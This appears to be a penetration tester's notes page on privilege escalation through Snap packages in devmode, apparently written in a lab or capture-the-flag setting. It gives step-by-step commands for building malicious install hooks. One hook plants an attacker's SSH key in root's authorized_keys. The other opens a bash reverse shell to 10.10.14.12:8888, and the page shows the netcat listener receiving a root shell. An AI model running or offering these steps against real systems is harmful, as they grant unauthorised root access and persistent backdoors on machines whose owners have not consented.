---
description: Snap is a package manager that packages and deploys applications.
---

# Snap package (PE)

### What is it?

Snaps is similar to `apt` , they are self-contained applications that run in a sandboxed environment, while limiting acess to the host system. However when running in `dev mode` which makes it interesting for potential privilege escalation.

> When installing a snap, snap uses a hook which is called the "install hook". This hook when executed in dev mode will give snap elevated privileges.

### Escalating privileges using Snapcraft

Start by installing snapd and snapcraft.

```bash
sudo apt update
sudo apt install snapd
sudo snap install --classic snapcraft
```

Make directory to work in, initialize and setup the install hook

```bash
# Make an empty directory to work with
mkdir new_snap
cd new_snap

# Initialize the directory as a snap project
snapcraft init

# Set up the install hook
mkdir snap/hooks
touch snap/hooks/install
chmod a+x snap/hooks/install
```

Then write a bash script we can run as root. We generate a SSH key pair on our local VM and copy the public key to the target.

```bash
cat > snap/hooks/install << "EOF"
#!/bin/bash

mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1ycHXJcjXrbJxx zn@zn" > /root/.ssh/authorized_keys
EOF

```

Edit the yaml file or if you have trouble making the snap package, try changing the base to core22 or core20 in the yaml file.

```bash
name: my-snap-name 
base: core24 
version: '0.1' 
summary: Single-line elevator pitch for your amazing snap 
description: |
  This is my-snap's description. You have a paragraph or two to tell the
  most important story about your snap. Keep it under 100 words though,
  we live in tweetspace and your description wants to look good in the snap
  store.

grade: devel 
confinement: devmode 

parts:
  my-part:
    
    plugin: nil
```

After this you can run `snapcraft` and create the package, it wil create a snap file.

{% embed url="https://snapcraft.io/docs/create-a-new-snap" %}

We then copy the created snap file to the target either via a http server or using ssh and scp and run the snap file which will give acces via ssh.

```bash
# upload snap file
scp my-snap-name_0.1_amd64.snap user@10.10.10.14:/tmp

# run snap file and get ssh acces.
sudo snap install xxxx_1.0_all.snap --devmode --dangerou
```

### GTFObins method

Another easier and shorter way is to use the method from GTFO.

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

#### For this method you need to install

```bash
apt-get install ruby ruby-dev rubygems build-essential
gem install --no-document fpm
gem install fpm
```

And then execute the exploit

{% code overflow="wrap" %}
```bash
# Create directory
mkdir -p meta/hooks

# Insert payload 
printf '#!/bin/sh\n%s; false' "bash -i >& /dev/tcp/10.10.14.12/8888 0>&1" >meta/hooks/install

# Make file executable
chmod +x meta/hooks/install

# Create the snap file
fpm -n xxxx -s dir -t snap -a all meta

# Install snap package on target
sudo snap install xxxx_1.0_all.snap --dangerous --devmode
```
{% endcode %}

We got root shell:

```bash
$ nc -lvnp 8888                                        
listening on [any] 8888 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.233] 55368
bash-4.3# whoami
whoami
root
```
